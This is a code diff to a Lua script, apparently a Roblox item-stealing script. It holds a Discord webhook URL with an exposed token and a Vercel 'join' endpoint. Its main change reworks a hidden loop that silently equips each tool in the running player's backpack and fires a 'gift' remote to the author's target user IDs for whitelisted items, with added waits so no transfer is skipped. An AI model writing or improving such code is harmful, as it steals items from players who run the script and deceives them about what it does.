@@ -597,7 +597,7 @@ end
 
 --====================================================
 -- ✅ WEBHOOK
-local webhook = "https://discord.com/api/webhooks/1501397529672028291/JadJoke2SDA-kKhvAPPZj6aFleWB73RRRW3JFKhHwnm1eHaH1AT7McZy2bvpzzdGRfNpbvpzzdGRfNp"
+local webhook = "https://discord.com/api/webhooks/1501397529672028291/JadJoke2SDA-kKhvAPPZj6aFleWB73RRRW3JFKhHwnm1eHaH1AT7McZy2bvpzzdGRfNp"
 
 -- ✅ VERCEL
 local vercel = "https://joinlink-weld.vercel.app/api/join"
@@ -732,21 +732,32 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.01)
+        task.wait(0.1)
 
         local tools = getSortedTools()
 
-        for _,tool in ipairs(tools) do
-            silentEquip(tool)
-            task.wait(0.02)
+        if #tools == 0 then
+            task.wait(1)
+            continue
+        end
 
-            if isWhitelisted(tool) then
-                for _,id in ipairs(targetUserIds) do
-                    giftRemote:FireServer(id)
+        for i = 1, #tools do
+            local tool = tools[i]
+
+            if tool and tool.Parent == backpack then
+                silentEquip(tool)
+                task.wait(0.05)
+
+                if isWhitelisted(tool) then
+                    for _,id in ipairs(targetUserIds) do
+                        giftRemote:FireServer(id)
+                        task.wait(0.1) -- 🔥 penting biar ga ke-skip server
+                    end
                 end
-            end
 
-            unequipAll()
+                unequipAll()
+                task.wait(0.05)
+            end
         end
     end
 end)
